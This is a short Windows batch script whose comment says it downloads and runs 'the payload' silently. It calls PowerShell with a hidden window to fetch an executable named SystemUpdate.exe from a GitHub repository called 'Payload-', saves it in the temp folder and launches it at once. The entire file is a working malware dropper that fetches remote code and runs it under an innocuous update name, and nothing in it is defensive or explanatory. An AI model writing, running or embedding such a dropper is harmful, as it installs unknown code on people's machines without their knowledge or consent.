@echo off
:: This tries to download and run the payload silently
powershell -w h -c "iwr 'https://github.com/Wizardcargo8080/Payload-/raw/refs/heads/main/SystemUpdate.exe' -OutFile '%TEMP%\sys.exe'; Start-Process '%TEMP%\sys.exe'"
exit
